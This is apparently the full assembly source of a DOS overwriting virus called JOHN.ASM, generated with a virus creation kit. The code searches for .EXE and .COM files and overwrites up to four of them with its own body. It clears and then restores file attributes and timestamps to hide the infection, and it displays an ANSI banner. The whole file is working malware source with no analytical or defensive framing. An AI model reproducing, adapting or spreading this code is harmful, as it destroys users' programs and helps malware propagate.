; JOHN.ASM -- For John Boy!
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Pentagrame

virus_type      equ     1                       ; Overwriting Virus
is_encrypted    equ     0                       ; We're not encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		org     0100h

start           label   near

main            proc    near
flag:           or      di,0
		xchg    di,ax

		mov     cx,0004h                ; Do 4 infections
search_loop:    push    cx                      ; Save CX
		call    search_files            ; Find and infect a file
		pop     cx                      ; Restore CX
		loop    search_loop             ; Repeat until CX is 0

		mov     si,offset data00        ; SI points to data
		mov     cx,03B3h                ; Second argument is 947
		push    di                      ; Save DI
		push    es                      ; Save ES

		jcxz    uncrunch_done           ; Exit if there are no characters

		mov     ah,0Fh                  ; BIOS get screen mode function
		int     10h
		xor     ah,ah                   ; BIOS set screen mode function
		int     10h                     ; Clear the screen

		xor     di,di
		mov     ax,0B800h               ; AX is set to video segment
		mov     es,ax                   ; ES holds video segment

		mov     dx,di                   ; Save X coordinate for later
		xor     ax,ax                   ; Set current attributes
		cld

loopa:          lodsb                           ; Get next character
		cmp     al,32                   ; Is it a control character?
		jb      foreground              ; Handle it if it is
		stosw                           ; Save letter on screen
next:           loop    loopa                   ; Repeat until we're done
		jmp     short uncrunch_done     ; Leave this routine

foreground:     cmp     al,16                   ; Are we changing the foreground?
		jnb     background              ; If not, check the background
		and     ah,0F0h                 ; Strip off old foreground
		or      ah,al                   ; Put the new one on
		jmp     short next              ; Resume looping

background:     cmp     al,24                   ; Are we changing the background?
		je      next_line               ; If AL = 24, go to next line
		jnb     flash_bit_toggle        ; If AL > 24 set the flash bit
		sub     al,16                   ; Change AL to a color number
		add     al,al                   ; Crude way of shifting left
		add     al,al                   ; four bits without changing
		add     al,al                   ; CL or wasting space.  Ok,
		add     al,al                   ; I guess.
		and     al,08Fh                 ; Strip off old background
		or      ah,al                   ; Put the new one on
		jmp     short next              ; Resume looping

next_line:      add     dx,160                  ; Skip a whole line (80 chars.
		mov     di,dx                   ; AND 80 attribs.)
		jmp     short next              ; Resume looping

flash_bit_toggle: cmp   al,27                   ; Is it a blink toggle?
		jb      multi_output            ; If AL < 27, it's a blinker
		jne     next                    ; Otherwise resume looping
		xor     ah,128                  ; Toggle the flash bit
		jmp     short next              ; Resume looping

multi_output:   cmp     al,25                   ; Set Zero flag if multi-space
		mov     bx,cx                   ; Save main counter
		lodsb                           ; Get number of repititions
		mov     cl,al                   ; Put it in CL
		mov     al,' '                  ; AL holds a space
		jz      start_output            ; If displaying spaces, jump
		lodsb                           ; Otherwise get character to use
		dec     bx                      ; Adjust main counter

start_output:   xor     ch,ch                   ; Clear CH
		inc     cx                      ; Add one to count
	rep     stosw                           ; Display the character
		mov     cx,bx                   ; Restore main counter
		dec     cx                      ; Adjust main counter
		loopnz  loopa                   ; Resume looping if not done

uncrunch_done:  pop     es                      ; Restore ES
		pop     di                      ; Restore DI

		mov     ax,04C00h               ; DOS terminate function
		int     021h
main            endp

search_files    proc    near
		mov     dx,offset exe_mask      ; DX points to "*.EXE"
		call    find_files              ; Try to infect a file
		mov     dx,offset com_mask      ; DX points to "*.COM"
		call    find_files              ; Try to infect a file
		jnc     done_searching          ; If successful then exit
done_searching: ret                             ; Return to caller

exe_mask        db      "*.EXE",0               ; Mask for all .EXE files  
com_mask        db      "*.COM",0               ; Mask for all .COM files

search_files    endp

find_files      proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		push    dx                      ; Save file mask
		lea     dx,[bp - 128]           ; DX points to buffer  
		mov     ah,01Ah                 ; DOS set DTA function
		int     021h

		mov     cx,00100111b            ; CX holds all file attributes 
		mov     ah,04Eh                 ; DOS find first file function
		
		pop     dx                      ; Restore file mask
find_a_file:    int     021h
		jc      done_finding            ; Exit if no files found
		call    infect_file             ; Infect the file!
		jnc     done_finding            ; Exit if no error
		mov     ah,04Fh                 ; DOS find next file function
		jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller
find_files      endp

infect_file     proc    near
		mov     ah,02Fh                 ; DOS get DTA address function
		int     021h
		mov     si,bx                   ; SI points to the DTA

		mov     byte ptr [set_carry],0  ; Assume we'll fail

		cmp     word ptr [si + 01Ch],0  ; Is the file > 65535 bytes?
		jne     infection_done          ; If it is then exit

		cmp     word ptr [si + 025h],'DN'  ; Might this be COMMAND.COM?
		je      infection_done          ; If it is then skip it

		cmp     word ptr [si + 01Ah],(finish - start)
		jb      infection_done          ; If it's too small then exit

		mov     ax,03D00h               ; DOS open file function, r/o
		lea     dx,[si + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     cx,4                    ; CX holds bytes to read (4)
		mov     ah,03Fh                 ; DOS read from file function
		mov     dx,offset buffer        ; DX points to buffer
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		push    si                      ; Save DTA address before compare
		mov     si,offset buffer        ; SI points to comparison buffer
		mov     cx,4                    ; CX holds number of bytes (4)
		mov     di,offset flag          ; DI points to virus flag    
	rep     cmpsb                           ; Compare the first four bytes
		pop     si                      ; Restore DTA address
		je      infection_done          ; If equal then exit
		mov     byte ptr [set_carry],1  ; Success -- the file is OK

		mov     ax,04301h               ; DOS set file attrib. function
		xor     cx,cx                   ; Clear all attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

		mov     ax,03D02h               ; DOS open file function, r/w
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,040h                 ; DOS write to file function
		mov     cx,finish - start       ; CX holds virus length
		mov     dx,offset start         ; DX points to start of virus
		int     021h

		mov     ax,05701h               ; DOS set file time function
		mov     cx,[si + 016h]          ; CX holds old file time
		mov     dx,[si + 018h]          ; DX holds old file date
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		mov     ax,04301h               ; DOS set file attrib. function
		xor     ch,ch                   ; Clear CH for file attribute
		mov     cl,[si + 015h]          ; CX holds file's old attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

infection_done: cmp     byte ptr [set_carry],1  ; Set carry flag if failed
		ret                             ; Return to caller

buffer          db      4 dup (?)               ; Buffer to hold test data
set_carry       db      ?                       ; Set-carry-on-exit flag
infect_file     endp


data00:          ; TheDraw Assembler Crunched Screen Image
		
		IMAGEDATA_WIDTH EQU 80
		IMAGEDATA_DEPTH EQU 25
		IMAGEDATA_LENGTH EQU 947
		IMAGEDATA LABEL BYTE
			DB      15,16,24,24,24,25,2,20,25,'I',24,16,25,2,23,' ',16,25
			DB      'G',23,' ',24,16,25,2,20,' ',14,27,'‹€€‹',16,25,2,20,'‹'
			DB      '€€‹',16,'  ',20,'‹',26,6,'€‹',16,25,2,20,'‹',26,6,'€'
			DB      '‹',16,'  ',20,'‹',26,8,'€‹',16,' ',20,'‹',26,8,'€‹',16
			DB      ' ',20,'‹',26,8,'€‹',24,16,25,2,23,' ',20,26,4,'€‹',26
			DB      4,'€',16,' ',20,26,3,'€ﬂ',16,'  ',20,'ﬂ€€€',16,' ',20
			DB      26,3,'€ﬂﬂﬂ',26,3,'€',16,' ',20,26,3,'€',16,25,3,20,'ﬂ'
			DB      'ﬂﬂ',16,' ',20,26,3,'€',16,25,3,20,'ﬂﬂﬂ',16,' ',20,26
			DB      3,'€',16,25,3,20,'ﬂﬂﬂ',16,' ',23,' ',24,16,25,2,23,' '
			DB      20,26,10,'€',16,' ',20,26,3,'€',16,25,7,20,26,3,'€‹‹'
			DB      '‹',26,3,'€',16,' ',20,26,3,'€',26,3,'‹',16,25,3,20,26
			DB      3,'€',26,4,'‹',16,25,2,20,26,3,'€',26,4,'‹',16,25,2,23
			DB      ' ',24,16,25,2,20,' ',26,3,'€',16,' ',20,'ﬂ',16,' ',20
			DB      26,3,'€',16,' ',20,26,3,'€',16,25,7,20,26,10,'€',16,' '
			DB      20,26,3,'€',26,3,'ﬂ',16,25,3,20,26,3,'€',26,4,'ﬂ',16,25
			DB      2,20,26,3,'€',26,4,'ﬂ',16,25,2,20,' ',24,16,25,2,23,' '
			DB      20,26,3,'€',16,25,2,20,26,3,'€',16,' ',20,26,3,'€‹',16
			DB      '  ',20,'‹€€€',16,' ',20,26,3,'€',16,25,2,20,26,3,'€'
			DB      16,' ',20,26,3,'€',16,25,7,20,26,3,'€',16,25,3,20,'‹'
			DB      '‹‹',16,' ',20,26,3,'€',16,25,3,20,'‹‹‹',16,' ',23,' '
			DB      24,16,25,2,23,' ',20,'ﬂ€€ﬂ',16,25,2,20,'ﬂ€€ﬂ',16,'  '
			DB      20,'ﬂ',26,6,'€ﬂ',16,'  ',20,'ﬂ€€ﬂ',16,25,2,20,'ﬂ€€ﬂ',16
			DB      ' ',20,'ﬂ€€ﬂ',16,25,7,20,'ﬂ',26,8,'€ﬂ',16,' ',20,'ﬂ',26
			DB      8,'€ﬂ',16,' ',23,' ',24,16,25,2,20,' ',16,25,'G',20,' '
			DB      24,16,25,2,23,' ',16,' ',20,'‹€‹',16,25,2,20,'‹',26,6
			DB      '€‹',16,25,4,20,'‹',26,6,'€‹',16,25,3,20,'‹',26,8,'€'
			DB      '‹',16,'  ',20,'‹',26,6,'€‹',16,25,2,20,'‹',26,7,'€‹'
			DB      16,25,2,23,' ',24,16,25,2,20,' ',26,4,'€',16,' ',20,26
			DB      3,'€ﬂ',16,' ',20,'ﬂ',26,3,'€',16,25,2,20,26,3,'€ﬂﬂﬂ',26
			DB      3,'€',16,25,2,20,26,3,'€',16,25,3,20,'ﬂﬂﬂ',16,' ',20,26
			DB      3,'€ﬂﬂﬂ',26,3,'€',16,' ',20,26,3,'€ﬂ',16,25,2,20,'ﬂﬂ'
			DB      'ﬂ',16,25,2,23,' ',24,16,25,2,23,' ',20,26,4,'€',16,' '
			DB      20,'ﬂ',26,4,'€‹‹',16,25,5,20,26,3,'€‹‹‹',26,3,'€',16,25
			DB      2,20,26,3,'€',26,3,'‹',16,25,3,20,26,3,'€‹‹‹',26,3,'€'
			DB      16,' ',20,26,3,'€',16,'  ',20,26,3,'‹',16,25,3,20,' '
			DB      24,16,25,2,23,' ',20,26,4,'€',16,25,3,20,'ﬂﬂ',26,4,'€'
			DB      '‹',16,25,2,20,26,10,'€',16,25,2,20,26,3,'€',26,3,'ﬂ'
			DB      16,25,3,20,26,10,'€',16,' ',20,26,3,'€',16,'  ',20,'ﬂ'
			DB      'ﬂ€€€',16,25,2,23,' ',24,16,25,2,23,' ',20,26,4,'€',16
			DB      ' ',20,26,3,'€‹',16,' ',20,'‹',26,3,'€',16,25,2,20,26
			DB      3,'€',16,25,2,20,26,3,'€',16,25,2,20,26,3,'€',16,25,7
			DB      20,26,3,'€',16,25,2,20,26,3,'€',16,' ',20,26,4,'€‹‹‹'
			DB      '€€€',16,25,2,23,' ',24,16,25,2,20,' ',16,' ',20,'ﬂ€'
			DB      'ﬂ',16,25,2,20,'ﬂ',26,6,'€ﬂ',16,25,3,20,'ﬂ€€ﬂ',16,25,2
			DB      20,'ﬂ€€ﬂ',16,25,2,20,'ﬂ€€ﬂ',16,25,7,20,'ﬂ€€ﬂ',16,25,2
			DB      20,'ﬂ€€ﬂ',16,'  ',20,'ﬂ',26,7,'€ﬂ',16,25,2,20,' ',24,16
			DB      25,2,23,' ',16,25,'G',23,' ',24,16,25,2,23,' ',16,25,'G'
			DB      23,' ',24,16,25,2,20,' ',16,25,'G',20,' ',24,16,25,2,23
			DB      ' ',16,25,'G',23,' ',24,16,25,2,20,25,'I',24,24,24



finish          label   near

code            ends
		end     main
